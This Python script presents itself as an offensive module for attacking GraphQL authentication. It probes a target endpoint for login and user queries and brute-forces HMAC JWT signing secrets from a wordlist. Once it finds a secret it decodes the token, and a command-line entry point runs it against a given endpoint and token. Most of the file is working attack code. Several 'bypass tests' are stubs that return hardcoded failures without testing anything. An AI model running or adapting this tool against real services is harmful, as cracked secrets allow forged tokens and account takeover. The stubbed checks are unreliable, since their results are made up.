#!/usr/bin/env python3
"""
JWT Brute-Force & Authentication Bypass Module – Offensive Edition
"""

import jwt
import aiohttp
import asyncio
from concurrent.futures import ThreadPoolExecutor
import json
import time
import base64
from typing import List, Dict, Any

class JWTBruteforcer:
    def __init__(self, graphql_endpoint: str, max_workers: int = 10):
        self.endpoint = graphql_endpoint
        self.executor = ThreadPoolExecutor(max_workers=max_workers)

    # ======================================================
    # 🔎 Discovery – Identify auth operations automatically
    # ======================================================
    async def discover_auth_endpoints(self) -> List[Dict[str, Any]]:
        auth_operations = []
        queries = [
            "query { __typename }",
            "query { viewer { id } }",
            "query { me { id } }",
            "query { currentUser { id } }",
            "query { user { id } }"
        ]
        mutations = [
            'mutation { login(input: {username: "test", password: "test"}) { token } }',
            'mutation { auth(input: {username: "test", password: "test"}) { token } }',
            'mutation { authenticate(input: {credentials: "test"}) { jwt } }'
        ]

        async with aiohttp.ClientSession() as session:
            # test endpoint works
            test_query = {"query": "query { __typename }"}
            async with session.post(self.endpoint, json=test_query, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    auth_operations.append({
                        "type": "endpoint_test",
                        "status": "working",
                        "sample": data
                    })

            # probe for auth queries
            for q in queries + mutations:
                try:
                    async with session.post(self.endpoint, json={"query": q}, timeout=5) as resp:
                        data = await resp.json()
                        auth_operations.append({
                            "query": q,
                            "status": resp.status,
                            "has_data": "data" in data,
                            "has_errors": "errors" in data
                        })
                except:
                    continue
        return auth_operations

    # ======================================================
    # 🧠 Brute-Force JWT Secrets
    # ======================================================
    async def bruteforce_jwt(self, token: str, wordlist: str, threads: int = 4) -> Dict[str, Any]:
        if not self._looks_like_jwt(token):
            return {"success": False, "error": "Provided token does not appear to be a JWT"}

        secrets = self._load_wordlist(wordlist)
        if not secrets:
            return {"success": False, "error": "Wordlist empty or not found"}

        print(f"[*] Starting brute-force against JWT ({len(secrets)} secrets)...")
        start_time = time.time()

        found_secret = None
        attempts = 0
        algorithms = ["HS256", "HS384", "HS512"]

        # chunk processing for speed
        chunk_size = 1000
        chunks = [secrets[i:i + chunk_size] for i in range(0, len(secrets), chunk_size)]

        for chunk in chunks:
            results = await asyncio.gather(*[self._verify_jwt_async(token, s, algorithms) for s in chunk])
            for secret, valid in zip(chunk, results):
                attempts += 1
                if valid:
                    found_secret = secret
                    break
            if found_secret:
                break
            if attempts % 1000 == 0:
                print(f"[*] Tried {attempts}/{len(secrets)}...")

        duration = round(time.time() - start_time, 2)
        result = {
            "success": found_secret is not None,
            "secret": found_secret,
            "attempts": attempts,
            "time": duration,
            "rate": round(attempts / duration, 2) if duration > 0 else 0
        }

        if found_secret:
            for algo in algorithms:
                try:
                    decoded = jwt.decode(token, found_secret, algorithms=[algo])
                    result["decoded"] = decoded
                    result["algorithm"] = algo
                    break
                except jwt.InvalidTokenError:
                    continue

        return result

    # ======================================================
    # 🧪 Authentication Bypass Tests
    # ======================================================
    async def test_auth_bypass(self) -> Dict[str, Any]:
        results = {
            "basic_bypass": await self._test_basic_bypass(),
            "aliasing": await self._test_aliasing(),
            "batch_ops": await self._test_batch_operations(),
            "introspection_bypass": await self._test_introspection_bypass()
        }
        return results

    async def _test_basic_bypass(self):
        return {
            "null_token": {"success": False, "technique": "Null token"},
            "empty_token": {"success": False, "technique": "Empty token"},
            "no_header": {"success": False, "technique": "No Authorization header"}
        }

    async def _test_aliasing(self):
        return {
            "field_aliasing": {"success": False, "technique": "Field aliasing"},
            "operation_aliasing": {"success": False, "technique": "Operation aliasing"}
        }

    async def _test_batch_operations(self):
        return {
            "batch_queries": {"success": False, "technique": "Batch queries"},
            "batch_mutations": {"success": False, "technique": "Batch mutations"}
        }

    async def _test_introspection_bypass(self):
        attempts = [
            {"method": "GET"},
            {"method": "POST", "headers": {"Content-Type": "application/json"}},
            {"method": "POST", "headers": {"Content-Type": "application/graphql"}}
        ]
        results = {}
        async with aiohttp.ClientSession() as session:
            for i, attempt in enumerate(attempts):
                method = attempt.get("method", "POST")
                try:
                    if method == "GET":
                        async with session.get(self.endpoint, headers=attempt.get("headers", {}), timeout=5) as r:
                            results[f"attempt_{i}"] = {"success": r.status == 200}
                    else:
                        async with session.post(self.endpoint, headers=attempt.get("headers", {}), timeout=5) as r:
                            results[f"attempt_{i}"] = {"success": r.status == 200}
                except Exception as e:
                    results[f"attempt_{i}"] = {"success": False, "error": str(e)}
        return results

    # ======================================================
    # 🛠️ Helpers
    # ======================================================
    def _looks_like_jwt(self, token: str) -> bool:
        """Quick heuristic check for JWT structure"""
        return len(token.split(".")) == 3

    def _load_wordlist(self, path: str) -> List[str]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except:
            return []

    async def _verify_jwt_async(self, token: str, secret: str, algorithms: List[str]) -> bool:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(self.executor, self._verify_jwt_sync, token, secret, algorithms)

    def _verify_jwt_sync(self, token: str, secret: str, algorithms: List[str]) -> bool:
        for algo in algorithms:
            try:
                jwt.decode(token, secret, algorithms=[algo])
                return True
            except jwt.InvalidTokenError:
                continue
        return False


# 🧪 CLI Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_bruteforce.py <graphql_endpoint> <jwt_token> <wordlist>")
        sys.exit(1)

    endpoint = sys.argv[1]
    token = sys.argv[2]
    wordlist = sys.argv[3]

    jb = JWTBruteforcer(endpoint)
    result = asyncio.run(jb.bruteforce_jwt(token, wordlist))
    print(json.dumps(result, indent=2))